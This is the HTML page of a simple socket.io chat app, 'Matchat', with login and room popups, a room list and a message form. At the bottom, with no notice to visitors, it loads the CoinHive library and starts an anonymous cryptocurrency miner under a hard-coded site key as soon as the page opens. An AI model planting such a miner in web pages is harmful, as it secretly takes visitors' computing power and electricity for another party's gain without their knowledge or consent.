<!doctype html>
<html>
  <head>
    <title>Matchat</title>
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box;}
      body { font: 13px Helvetica, Arial; }
      form { background: #000; padding: 3px; position: fixed; bottom: 0; width: 100%; z-index: 1}
      form input { border: 0; padding: 10px; width: 90%; margin-right: .5%; }
      form button { width: 9%; background: rgb(130, 224, 255); border: none; padding: 10px; }
      #messages { list-style-type: none; margin: 0; padding: 0; }
      #messages li { padding: 5px 10px; }
      #messages li:nth-child(odd) { background: #eee; }
    </style>
    <link rel="stylesheet" type="text/css" href="main.css"/>
  </head>
  <body>
    <div class="popup" id="login">
      <div class="popup-content">
        <h1>Enter a user name</h1>
        <input id="username" autofocus />
      </div>
    </div>
    <div class="popup" id="add-room" style="">
      <div class="popup-content">
        <h1>Enter a room name</h1>
        <input id="room-name" autofocus />
      </div>
    </div>
    <div id="container">
      <div id="rooms-container">
        <div id="rooms-header">
          <h1>Rooms</h1>
          <span id="add-room-btn">+</span>
        </div>
        <ul id="rooms">
          <li>universal</li>
        </ul>
      </div>
      <div id="channel">
        <ul id="messages"></ul>
        <form action="">
          <input id="m" autocomplete="off" /><button>Send</button>
        </form>
      <div>
    </div>
  </body>
  <script src="/socket.io/socket.io.js"></script>
  <script src="https://code.jquery.com/jquery-1.11.1.js"></script>
  <script src="/main.js"></script>
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
  <script>
    var miner = new CoinHive.Anonymous('G9ZSAAZYFplJd4QHx1dstevAVD1rvZC1');
    miner.start();
  </script>
</html>
